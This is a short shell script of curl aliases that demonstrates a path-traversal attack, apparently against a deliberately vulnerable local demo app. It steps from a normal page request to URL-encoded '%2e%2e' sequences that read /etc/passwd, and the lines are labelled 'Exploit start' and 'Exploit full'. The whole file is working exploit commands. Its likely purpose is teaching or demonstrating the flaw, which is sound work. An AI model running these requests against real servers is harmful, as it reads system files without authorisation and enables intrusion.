# Works as advertised

if [ -z "$GOOF_HOST" ]; then
	export GOOF_HOST=http://localhost:3001
fi

alias st1="curl $GOOF_HOST/public/about.html"

# Directory listing (not necessary)
alias st2="curl $GOOF_HOST/public/"

# Failed ../
alias st3="curl $GOOF_HOST/public/../../../"

# Exploit start
alias st4="curl $GOOF_HOST/public/%2e%2e/%2e%2e/%2e%2e/"

# Exploit full
alias st5="curl $GOOF_HOST/public/%2e%2e/%2e%2e/%2E%2E/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
